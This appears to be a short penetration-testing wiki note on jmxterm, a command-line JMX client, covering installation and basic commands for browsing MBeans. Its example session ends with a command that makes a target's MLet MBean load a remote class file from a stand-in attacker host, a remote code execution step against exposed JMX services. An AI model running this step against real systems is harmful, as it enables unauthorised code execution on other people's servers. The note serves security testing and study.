# jmxterm

**Tags:** `#jmxterm` `#jmx` `#mbean` `#java` `#cli`

Scriptable command-line JMX client (Cyclops Group). Where `jconsole` is a GUI, jmxterm drives the same JMX/MBean surface from a shell or a piped script — connect to a JMX agent, list domains and MBeans, read/write attributes, and invoke operations. Used to browse an unauthenticated JMX service for dangerous MBeans and to trigger MLet loading during exploitation.

**Source:** https://github.com/jiaqi/jmxterm (releases on SourceForge)
**Install:** Download `jmxterm-<ver>-uber.jar`; run `java -jar jmxterm.jar`.

```bash
java -jar jmxterm.jar
# at the prompt:
open <target>:1099        # connect
domains                   # list JMX domains
beans                     # list MBeans
bean DefaultDomain:type=MLet
info                      # show attributes/operations
run getMBeansFromURL http://<attacker>:8080/mlet.html
```

GUI alternative: [[Tools/Web/jconsole|jconsole]]; all-in-one attack tool: [[Tools/Web/beanshooter|beanshooter]].

---

> [!note] **See also** — [[Services/Web Services/JMX|JMX]] — scriptable MBean browsing/invocation and MLet-based remote class loading.

---

*Created: 2026-09-25*
*Updated: 2026-09-25*
*Model: claude-opus-4-8*
